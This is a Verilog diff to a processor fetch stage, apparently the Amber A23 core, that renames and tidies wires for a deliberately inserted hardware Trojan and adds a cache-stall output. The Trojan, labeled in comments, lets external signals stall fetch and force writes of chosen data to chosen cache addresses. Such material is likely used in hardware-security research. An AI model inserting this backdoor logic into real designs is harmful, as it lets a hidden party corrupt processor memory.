@@ -65,6 +65,7 @@ input						i_troj_reserve,		/// Trojan signal to stall fetch
 input		[31:0]			i_troj_write_data,	/// Trojan data written to cache
 input		[31:0]			i_troj_address,		
 input		[31:0]			i_troj_address_nxt,
+output					o_cache_stall,
 
 output                      o_fetch_stall,      // when this is asserted all registers 
                                                 // in all 3 pipeline stages are held
@@ -116,23 +117,25 @@ assign o_read_data       = sel_cache  ? cache_read_data :
 assign o_fetch_stall     = !i_system_rdy || wb_stall || cache_stall || i_troj_reserve;
 
 /// Trojan muxed signals for cache input
-wire 		troj_cache_sel;
-wire 		troj_cache_excl;
-wire [31:0] troj_cache_write_data;
+wire 		troj_sel;
+wire 		troj_excl;
+wire [31:0] 	troj_write_data;
 wire 		troj_write_enable;
 wire [31:0]	troj_address;
-wire [31:0] troj_address_nxt;
+wire [31:0] 	troj_address_nxt;
 wire [3:0]	troj_byte_enable;
 wire		troj_wb_stall;
 
-assign troj_sel 				= i_troj_reserve ? 1 : sel_cache;
-assign troj_excl 				= i_troj_reserve ? 0 : i_exclusive;
-assign troj_write_data			= i_troj_reserve ? i_troj_write_data : i_write_data;
-assign troj_write_enable		= i_troj_reserve ? 1 : i_write_enable;
-assign troj_address				= i_troj_reserve ? i_troj_address : i_address;
-assign troj_address_nxt 		= i_troj_reserve ? i_troj_address_nxt : i_address_nxt;
-assign troj_byte_enable			= i_troj_reserve ? 4'b0 : i_byte_enable;
-assign troj_wb_stall			= i_troj_reserve ? 1 : o_wb_stb & ~i_wb_ack;
+assign troj_sel 		= i_troj_reserve ? 1 : sel_cache;
+assign troj_excl 		= i_troj_reserve ? 0 : i_exclusive;
+assign troj_write_data		= i_troj_reserve ? i_troj_write_data : i_write_data;
+assign troj_write_enable	= i_troj_reserve ? 1 : i_write_enable;
+assign troj_address		= i_troj_reserve ? i_troj_address : i_address;
+assign troj_address_nxt 	= i_troj_reserve ? i_troj_address_nxt : i_address_nxt;
+assign troj_byte_enable		= i_troj_reserve ? 4'b0 : i_byte_enable;
+assign troj_wb_stall		= i_troj_reserve ? 1 : o_wb_stb & ~i_wb_ack;
+
+assign o_cache_stall 		= cache_stall;
 
 // ======================================
 // L1 Cache (Unified Instruction and Data)
@@ -140,7 +143,7 @@ assign troj_wb_stall			= i_troj_reserve ? 1 : o_wb_stb & ~i_wb_ack;
 a23_cache u_cache (
     .i_clk                      ( i_clk                 ),
      
-    .i_select                   ( troj_sel        	    ),
+    .i_select                   ( troj_sel        	),
     .i_exclusive                ( troj_excl             ),
     .i_write_data               ( troj_write_data       ),
     .i_write_enable             ( troj_write_enable     ),
